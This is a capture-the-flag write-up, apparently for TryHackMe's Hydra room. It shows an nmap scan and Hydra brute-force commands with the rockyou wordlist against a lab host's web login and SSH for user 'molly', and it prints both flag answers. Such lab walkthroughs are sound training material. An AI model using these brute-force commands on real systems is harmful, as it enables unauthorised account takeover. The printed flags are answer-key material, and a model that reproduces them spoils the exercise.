# Hydra 

### [Task 2] 

#####  1. Use Hydra to bruteforce molly's web password. What is flag 1?

* Scan open ports
```nmap -sV -sS 10.10.166.155```

![nmap-scan](https://user-images.githubusercontent.com/62840507/128612421-d85ea0f6-64de-454c-ac84-dfb749fe4fa8.png)

* There is a website on port 80. Let's take a look at it. 

![Ekran Görüntüsü (2)](https://user-images.githubusercontent.com/62840507/128612567-faacea6f-38fc-46ab-9c91-991377fbd9d8.png)

* According ot the question the user name is molly and we now need to find her password with hydra.

``` hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.166.155 http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect" -V ```

![image](https://user-images.githubusercontent.com/62840507/128612618-53e8b508-20c2-47ac-80ea-1dfd8084c80b.png)


Login with these credentials and you will find the flag.

**Flag1 :** THM{2673a7dd116de68e85c48ec0b1f2612e}


##### 2. Use Hydra to bruteforce molly's SSH password. What is flag 2?

* We need SSH password. Command I used

``` hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.166.155 ssh -t 4 ```

![image](https://user-images.githubusercontent.com/62840507/128612950-a4045c04-23ef-437c-8866-7140512b8bdb.png)


* Now that we have the SSH password, we can login in with those credentials.

```ssh molly@10.10.166.155```

![image](https://user-images.githubusercontent.com/62840507/128613063-397a5fde-6554-4a2c-9513-37d0569b3948.png)


**Flag2 :** THM{c8eeb0468febbadea859baeb33b2541b}


